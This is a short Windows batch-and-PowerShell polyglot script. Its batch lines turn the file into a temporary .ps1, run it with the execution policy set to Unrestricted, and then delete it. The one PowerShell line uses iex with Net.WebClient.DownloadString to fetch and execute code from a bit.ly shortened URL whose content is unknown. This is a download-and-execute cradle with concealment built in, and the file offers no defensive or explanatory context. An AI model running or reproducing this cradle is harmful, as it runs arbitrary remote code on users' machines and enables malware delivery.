;@echo off
;setlocal ENABLEEXTENSIONS
;rem make from X.bat a X.ps1 by removing all lines starting with ';' 
;Findstr -rbv "^[;]" %0 > %~dpn0.ps1 
;powershell -ExecutionPolicy Unrestricted -File %~dpn0.ps1 %*
;del %~dpn0.ps1
;endlocal
;goto :EOF


iex (New-Object Net.WebClient).DownloadString("http://bit.ly/e0Mw9w")


